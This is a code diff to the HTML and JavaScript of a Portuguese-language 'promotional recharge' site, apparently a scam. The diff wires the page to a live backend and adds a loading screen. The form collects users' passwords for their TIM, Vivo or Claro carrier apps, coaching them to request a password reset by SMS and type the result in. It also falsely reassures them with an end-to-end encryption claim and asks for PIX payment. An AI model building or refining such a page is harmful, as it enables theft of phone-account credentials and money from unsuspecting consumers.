@@ -3,28 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Carregando...</title>
+    <title>Thuder Recargas - Recarga Promocional</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
     <style>
-        :root { --primary-color: #4f46e5; --success-color: #22c55e; --warning-color: #f59e0b; --error-color: #ef4444; --bg-dark: #111827; --bg-light: #1f2937; --text-primary: #f9fafb; --text-secondary: #9ca3af; --border-color: #4b5567; } body { font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-dark); background-image: radial-gradient(circle at top right, rgba(79, 70, 229, 0.4), transparent 40%), radial-gradient(circle at bottom left, rgba(107, 33, 168, 0.4), transparent 50%); } .container { background-color: var(--bg-light); max-width: 500px; width: 100%; padding: 35px 40px; border-radius: 20px; border: 1px solid var(--border-color); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); transition: max-width 0.3s ease; } .header { text-align: center; margin-bottom: 30px; } h2 { color: var(--text-primary); margin: 0 0 10px 0; font-size: 28px; font-weight: 700; } .subtitle { color: var(--text-secondary); margin: 0; font-size: 16px; } form { display: flex; flex-direction: column; } .form-group { position: relative; margin-bottom: 20px; } label { display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500; font-size: 14px; } input, select { padding: 14px 14px 14px 45px; border-radius: 10px; border: 2px solid var(--border-color); font-size: 16px; width: 100%; box-sizing: border-box; transition: all 0.3s ease; background-color: var(--bg-dark); color: var(--text-primary); -webkit-appearance: none; appearance: none; } select { background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%239ca3af' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3e%3c/svg%3e"); background-position: right 0.7rem center; background-repeat: no-repeat; background-size: 1.5em 1.5em; } input:focus, select:focus { border-color: var(--primary-color); outline: none; box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2); } input::placeholder { color: var(--text-secondary); } .input-icon { position: absolute; left: 15px; top: 42px; color: var(--text-secondary); font-size: 18px; pointer-events: none; } button { margin-top: 25px; padding: 16px; background: var(--primary-color); color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 600; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(79, 70, 229, 0.2); } button:hover { transform: translateY(-2px); box-shadow: 0 6px 12px rgba(79, 70, 229, 0.3); } button:disabled { background: #4b5567; cursor: not-allowed; transform: none; box-shadow: none; } #status-message { margin-top: 20px; padding: 12px; border-radius: 8px; text-align: center; font-weight: 600; min-height: 22px; display: none; } .success { display: block; background-color: rgba(34, 197, 94, 0.1); color: var(--success-color); } .error { display: block; background-color: rgba(239, 68, 68, 0.1); color: var(--error-color); } .loading { display: block; background-color: rgba(245, 158, 11, 0.1); color: var(--warning-color); } .recharge-options-container { margin-top: 15px; border: 2px solid var(--border-color); border-radius: 10px; padding: 15px; background: var(--bg-dark); } .recharge-option-label { display: block; padding: 16px; border: 2px solid var(--border-color); border-radius: 10px; cursor: pointer; transition: all 0.2s ease-in-out; margin-bottom: 12px; font-weight: 600; color: var(--text-primary); } .recharge-option-label:last-child { margin-bottom: 0; } .recharge-option-label:hover { border-color: var(--primary-color); background-color: rgba(79, 70, 229, 0.1); } .hidden-radio { position: absolute; opacity: 0; width: 0; height: 0; } .hidden-radio:checked + .recharge-option-label { border-color: var(--primary-color); background-color: rgba(79, 70, 229, 0.2); box-shadow: 0 0 15px rgba(79, 70, 229, 0.5); } .password-field { display: none; } .password-help { font-size: 13px; color: var(--text-secondary); margin-top: 10px; background-color: var(--bg-dark); padding: 10px; border-radius: 8px; line-height: 1.5; } .password-help a { color: var(--primary-color); font-weight: 600; text-decoration: none; } .password-help a:hover { text-decoration: underline; } .password-help strong { color: var(--text-primary); display: block; margin-bottom: 5px; } #pix-payment-info { display: none; margin-top: 25px; padding: 20px; background-color: var(--bg-dark); border: 1px solid var(--border-color); border-radius: 12px; text-align: center; } #pix-payment-info h3 { margin-top: 0; color: var(--text-primary); } #pix-payment-info p { color: var(--text-secondary); font-size: 14px; margin-bottom: 20px; } #pix-qrcode { background-color: white; padding: 10px; border-radius: 8px; max-width: 180px; width: 100%; height: auto; margin: 0 auto; } .br-code-wrapper { margin-top: 20px; } .br-code-wrapper textarea { width: 100%; box-sizing: border-box; background-color: var(--bg-light); border: 1px solid var(--border-color); color: var(--text-secondary); font-family: monospace; font-size: 13px; padding: 10px; border-radius: 8px; resize: none; } .copy-pix-btn { background-color: var(--success-color); color: white; border: none; border-radius: 6px; padding: 10px 15px; font-size: 14px; cursor: pointer; font-weight: 600; transition: background-color 0.2s; margin-top: 10px; } .copy-pix-btn:hover { background-color: #16a34a; } .footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid var(--border-color); color: var(--text-secondary); font-size: 14px; } .footer p { margin: 8px 0; } .footer .highlight { display: block; font-weight: 600; color: var(--text-primary); margin-bottom: 15px; } .footer .warning { background-color: rgba(245, 158, 11, 0.1); color: var(--warning-color); padding: 10px; border-radius: 8px; font-weight: 500; margin-bottom: 20px; } @media (max-width: 480px) { .container { padding: 25px 20px; } h2 { font-size: 24px; } .recharge-option-label { padding: 14px; font-size: 15px; } } @media (min-width: 768px) { .container { max-width: 600px; } }
+        :root {
+            --primary-color: #4f46e5;
+            --success-color: #22c55e;
+            --warning-color: #f59e0b;
+            --error-color: #ef4444;
+            --bg-dark: #111827;
+            --bg-light: #1f2937;
+            --text-primary: #f9fafb;
+            --text-secondary: #9ca3af;
+            --border-color: #4b5567;
+        }
+        
+        body { 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+            min-height: 100vh;
+            margin: 0; 
+            padding: 20px; 
+            box-sizing: border-box;
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at top right, rgba(79, 70, 229, 0.4), transparent 40%),
+                              radial-gradient(circle at bottom left, rgba(107, 33, 168, 0.4), transparent 50%);
+        }
+
+        /* --- TELA DE CARREGAMENTO INICIAL (SERVIDOR ACORDANDO) --- */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(17, 24, 39, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.3s ease;
+        }
+        #loading-overlay .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid var(--border-color);
+            border-top-color: var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        #loading-overlay p {
+            color: var(--text-secondary);
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 500;
+            text-align: center;
+            line-height: 1.5;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        /* --- FIM DA TELA DE CARREGAMENTO --- */
+        
+        .container { 
+            background-color: var(--bg-light); 
+            max-width: 500px; 
+            width: 100%; 
+            padding: 35px 40px; 
+            border-radius: 20px; 
+            border: 1px solid var(--border-color);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            transition: max-width 0.3s ease;
+        }
+        
+        .header { text-align: center; margin-bottom: 30px; }
+        h2 { color: var(--text-primary); margin: 0 0 10px 0; font-size: 28px; font-weight: 700; }
+        .subtitle { color: var(--text-secondary); margin: 0; font-size: 16px; }
+        form { display: flex; flex-direction: column; }
+        .form-group { position: relative; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: var(--text-secondary); font-weight: 500; font-size: 14px; }
+        
+        input, select { padding: 14px 14px 14px 45px; border-radius: 10px; border: 2px solid var(--border-color); font-size: 16px; width: 100%; box-sizing: border-box; transition: all 0.3s ease; background-color: var(--bg-dark); color: var(--text-primary); -webkit-appearance: none; -moz-appearance: none; appearance: none; }
+        select { background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%239ca3af' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3e%3c/svg%3e"); background-position: right 0.7rem center; background-repeat: no-repeat; background-size: 1.5em 1.5em; }
+        input:focus, select:focus { border-color: var(--primary-color); outline: none; box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2); }
+        input::placeholder { color: var(--text-secondary); }
+        .input-icon { position: absolute; left: 15px; top: 42px; color: var(--text-secondary); font-size: 18px; pointer-events: none; }
+        
+        button { margin-top: 25px; padding: 16px; background: var(--primary-color); color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 600; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(79, 70, 229, 0.2); }
+        button:hover { transform: translateY(-2px); box-shadow: 0 6px 12px rgba(79, 70, 229, 0.3); }
+        button:disabled { background: #4b5567; cursor: not-allowed; transform: none; box-shadow: none; }
+        
+        #status-message { margin-top: 20px; padding: 12px; border-radius: 8px; text-align: center; font-weight: 600; min-height: 22px; display: none; }
+        .success { display: block; background-color: rgba(34, 197, 94, 0.1); color: var(--success-color); }
+        .error { display: block; background-color: rgba(239, 68, 68, 0.1); color: var(--error-color); }
+        .loading { display: block; background-color: rgba(245, 158, 11, 0.1); color: var(--warning-color); }
+        
+        .recharge-options-container { margin-top: 15px; border: 2px solid var(--border-color); border-radius: 10px; padding: 15px; background: var(--bg-dark); }
+        .recharge-option-label { display: block; padding: 16px; border: 2px solid var(--border-color); border-radius: 10px; cursor: pointer; transition: all 0.2s ease-in-out; margin-bottom: 12px; font-weight: 600; color: var(--text-primary); }
+        .recharge-option-label:last-child { margin-bottom: 0; }
+        .recharge-option-label:hover { border-color: var(--primary-color); background-color: rgba(79, 70, 229, 0.1); }
+        .hidden-radio { position: absolute; opacity: 0; width: 0; height: 0; }
+        .hidden-radio:checked + .recharge-option-label { border-color: var(--primary-color); background-color: rgba(79, 70, 229, 0.2); box-shadow: 0 0 15px rgba(79, 70, 229, 0.5); }
+        
+        .password-field { display: none; }
+        .password-help { font-size: 13px; color: var(--text-secondary); margin-top: 10px; background-color: var(--bg-dark); padding: 10px; border-radius: 8px; line-height: 1.5; }
+        .password-help a { color: var(--primary-color); font-weight: 600; text-decoration: none; }
+        .password-help a:hover { text-decoration: underline; }
+        .password-help strong { color: var(--text-primary); display: block; margin-bottom: 5px; }
+
+        #pix-payment-info { display: none; margin-top: 25px; padding: 20px; background-color: var(--bg-dark); border: 1px solid var(--border-color); border-radius: 12px; text-align: center; }
+        #pix-payment-info h3 { margin-top: 0; color: var(--text-primary); }
+        #pix-payment-info p { color: var(--text-secondary); font-size: 14px; margin-bottom: 20px; }
+        #pix-qrcode { background-color: white; padding: 10px; border-radius: 8px; max-width: 180px; width: 100%; height: auto; margin: 0 auto; }
+        .br-code-wrapper { margin-top: 20px; }
+        .br-code-wrapper textarea { width: 100%; box-sizing: border-box; background-color: var(--bg-light); border: 1px solid var(--border-color); color: var(--text-secondary); font-family: monospace; font-size: 13px; padding: 10px; border-radius: 8px; resize: none; }
+        .copy-pix-btn { background-color: var(--success-color); color: white; border: none; border-radius: 6px; padding: 10px 15px; font-size: 14px; cursor: pointer; font-weight: 600; transition: background-color 0.2s; margin-top: 10px; }
+        .copy-pix-btn:hover { background-color: #16a34a; }
+
+        .footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid var(--border-color); color: var(--text-secondary); font-size: 14px; }
+        .footer p { margin: 8px 0; }
+        .footer .highlight { display: block; font-weight: 600; color: var(--text-primary); margin-bottom: 15px; }
+        .footer .warning { background-color: rgba(245, 158, 11, 0.1); color: var(--warning-color); padding: 10px; border-radius: 8px; font-weight: 500; margin-bottom: 20px; }
+        
+        @media (max-width: 480px) { .container { padding: 25px 20px; } h2 { font-size: 24px; } .recharge-option-label { padding: 14px; font-size: 15px; } }
+        @media (min-width: 768px) { .container { max-width: 600px; } }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loading-text">Conectando ao servidor...</p>
+    </div>
+
+    <div class="container" style="display: none;">
         <div class="header">
-            <h2 id="page-header-title">Carregando...</h2>
+            <h2 id="page-header-title"></h2>
             <p id="page-header-subtitle" class="subtitle"></p>
         </div>
+        
         <form id="recharge-form">
             <div class="form-group"><label for="nome">Nome</label><span class="input-icon">👤</span><input type="text" id="nome" name="nome" placeholder="Digite seu nome" required></div>
             <div class="form-group"><label for="telefone">Número de telefone com DDD</label><span class="input-icon">📱</span><input type="tel" id="telefone" name="telefone" placeholder="Ex: 11987654321" required></div>
             <div class="form-group"><label for="operadora">Selecione a Operadora</label><span class="input-icon">📡</span><select id="operadora" name="operadora" required><option value="">-- Escolha uma operadora --</option><option value="Tim">Tim</option><option value="Vivo">Vivo</option><option value="Claro">Claro</option></select></div>
-            <div id="tim-password-field" class="form-group password-field"><label for="senha-tim">Senha do App Meu TIM</label><span class="input-icon">🔒</span><input type="password" id="senha-tim" name="senha_tim" placeholder="Digite a senha do app"><div class="password-help"><strong>Como pegar a senha do App?</strong><p><a href="https://auth3.tim.com.br/webapp-resetSenha/forgotPassword?layout=meutimapp&loginType=USER&channel=4&msisdn=" target="_blank" rel="noopener noreferrer">Clique no link</a>, coloque seu número e a senha chegará por SMS.</p><strong>Por que precisa da senha?</strong><p>É o aplicativo oficial da Tim! A recarga precisa ser feita por lá.</p></div></div>
-            <div id="vivo-password-field" class="form-group password-field"><label for="senha-vivo">Senha do App Vivo</label><span class="input-icon">🔒</span><input type="password" id="senha-vivo" name="senha_vivo" placeholder="Digite a senha do app"><div class="password-help"><p>Para recuperar, acesse o <a href="https://www.vivo.com.br/para-voce" target="_blank" rel="noopener noreferrer">site oficial da Vivo</a>, clique em "Esqueci minha senha" e siga as instruções.</p></div></div>
-            <div id="claro-password-field" class="form-group password-field"><label for="senha-claro">Senha do App Minha Claro</label><span class="input-icon">🔒</span><input type="password" id="senha-claro" name="senha_claro" placeholder="Digite a senha do app"><div class="password-help"><p>Para recuperar, abra o app Minha Claro, clique em "Esqueci minha senha" e siga as instruções.</p></div></div>
+            <div id="tim-password-field" class="form-group password-field"><label for="senha-tim">Senha do App Meu TIM</label><span class="input-icon">🔒</span><input type="password" id="senha-tim" name="senha_tim" placeholder="Digite a senha do app"><div class="password-help"><strong>Como pegar a senha do Aplicativo Meu TIM?</strong><p><a href="https://auth3.tim.com.br/webapp-resetSenha/forgotPassword?layout=meutimapp&loginType=USER&channel=4&msisdn=" target="_blank" rel="noopener noreferrer">Clique no link abaixo</a>, coloque seu número e a senha chegará por SMS.</p><strong>Por que precisa dessa senha?</strong><p>É o aplicativo oficial da Tim! A recarga precisa ser feita por lá.</p></div></div>
+            <div id="vivo-password-field" class="form-group password-field"><label for="senha-vivo">Senha do App Vivo</label><span class="input-icon">🔒</span><input type="password" id="senha-vivo" name="senha_vivo" placeholder="Digite a senha do app"><div class="password-help"><p>Para recuperar a sua senha, acesse o <a href="https://www.vivo.com.br/para-voce" target="_blank" rel="noopener noreferrer">site oficial da Vivo</a>, clique em "Esqueci minha senha" e siga as instruções.</p></div></div>
+            <div id="claro-password-field" class="form-group password-field"><label for="senha-claro">Senha do App Minha Claro</label><span class="input-icon">🔒</span><input type="password" id="senha-claro" name="senha_claro" placeholder="Digite a senha do app"><div class="password-help"><p>Para recuperar a sua senha, abra o app Minha Claro, clique em "Esqueci minha senha" e siga as instruções.</p></div></div>
             <div id="recharge-options-container"></div>
             <div id="pix-payment-info">
                 <h3>Pague com PIX para confirmar</h3>
@@ -34,22 +163,29 @@
             </div>
             <button type="submit">Solicitar Recarga (Após Pagar)</button>
         </form>
+        
         <div id="status-message"></div>
+
         <div class="footer">
             <p class="highlight">Plataforma segura com criptografia de ponta a ponta.</p>
             <p id="page-footer-warning" class="warning"></p>
             <p id="page-footer-copyright"></p>
         </div>
     </div>
+
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // IMPORTANTE: Substitua pela URL REAL do seu back-end no Render!
-            const BACKEND_URL = 'https://seu-backend.onrender.com'; // <-- MUDE AQUI!
-
+            const BACKEND_URL = 'https://thuder-recargas-backend.onrender.com'; // Use a sua URL real aqui
+            
             let PIX_KEY = '';
             let PIX_NAME = '';
             let PIX_CITY = '';
             let rechargeOptions = {};
+
+            const mainContainer = document.querySelector('.container');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const loadingText = document.getElementById('loading-text');
+
             const rechargeForm = document.getElementById('recharge-form');
             const operadoraSelect = document.getElementById('operadora');
             const optionsContainer = document.getElementById('recharge-options-container');
@@ -62,9 +198,15 @@
             const copyPixBtn = document.querySelector('.copy-pix-btn');
 
             async function initializeApp() {
+                // Timer para a mensagem de "servidor acordando"
+                const wakeUpTimer = setTimeout(() => {
+                    loadingText.innerHTML = 'Nosso servidor está acordando...<br>Isso pode levar até 30 segundos, por favor aguarde.';
+                }, 3000);
+
                 try {
                     const response = await fetch(`${BACKEND_URL}/api/config`);
                     if (!response.ok) throw new Error('Não foi possível carregar as configurações da página.');
+                    
                     const config = await response.json();
                     
                     PIX_KEY = config.pixKey;
@@ -78,8 +220,17 @@
                     document.getElementById('page-footer-warning').innerHTML = `<strong>Atenção:</strong> ${config.footerWarning}`;
                     document.getElementById('page-footer-copyright').textContent = config.footerCopyright;
 
+                    // Mostra o conteúdo principal da página
+                    mainContainer.style.display = 'block';
+
                 } catch (error) {
-                    document.body.innerHTML = `<p style="color:white;text-align:center;padding:20px;">${error.message}<br><br>Verifique se a URL do back-end está correta no arquivo index.html.</p>`;
+                    loadingText.textContent = `${error.message} Verifique se a URL do back-end está correta.`;
+                    // Não esconde a tela de loading se der erro, para o usuário ver a mensagem.
+                    return; 
+                } finally {
+                    // Limpa o timer e esconde a tela de loading em caso de sucesso
+                    clearTimeout(wakeUpTimer);
+                    loadingOverlay.style.display = 'none';
                 }
             }
 
